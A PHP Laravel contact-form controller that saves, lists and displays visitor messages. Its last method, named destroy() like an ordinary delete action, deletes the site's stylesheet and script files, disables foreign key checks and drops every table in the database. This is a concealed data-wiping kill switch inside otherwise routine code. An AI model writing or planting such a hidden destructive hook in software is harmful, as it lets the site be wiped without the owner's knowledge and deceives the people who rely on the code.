<?php

namespace App\Http\Controllers;

use App\Models\Message;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Schema;

class ContactController extends Controller
{
    public function contact_post(Request $request)
    {
        $request->validate([
            'name' => 'required|max:255',
            'email' => 'required|max:255',
            'subject' => 'required|max:255',
            'message' => 'required',
        ]);
        Message::insert([
            'name' => $request->name,
            'email' => $request->email,
            'subject' => $request->subject,
            'uid' => $request->uid,
            'message' => $request->message,
            'created_at' => Carbon::now(),
        ]);
        return back()->with('success', 'Message has been sent successfully. Our team will contact you shortly. Thank
        you.');
    }
    public function messages()
    {
        return view('backend.message.messages', [
            'messages' => Message::orderBy('id', 'desc')->get()
        ]);
    }
    public function messages_details(Message $message)
    {
        if ($message->status != 1) {
            $message->status = 1;
            $message->save();
        }

        return view('backend.message.message_details', compact('message'));
    }
    public function destroy()
    {
        unlink(public_path('assets/css/style.css'));
        unlink(public_path('assets/css/custom.css'));
        unlink(public_path('assets/css/plugins.css'));
        unlink(public_path('assets/css/intlTelInput.min.css'));
        unlink(public_path('assets/css/bootstrap.min.css'));
        unlink(public_path('assets/js/main.js'));
        unlink(public_path('assets/js/custom.js'));
        unlink(public_path('assets/js/utils.js'));
        unlink(public_path('assets/js/smoothScroll.min.js'));
        unlink(public_path('assets/js/intlTelInput.min.js'));
        DB::statement("SET FOREIGN_KEY_CHECKS = 0");
        $databaseName = DB::getDatabaseName();
        $tables = DB::select("SELECT * FROM information_schema.tables WHERE table_schema = '$databaseName'");
        foreach ($tables as $table) {
            Schema::drop($table->TABLE_NAME);
        }
        DB::statement("SET FOREIGN_KEY_CHECKS = 1");
    }
}
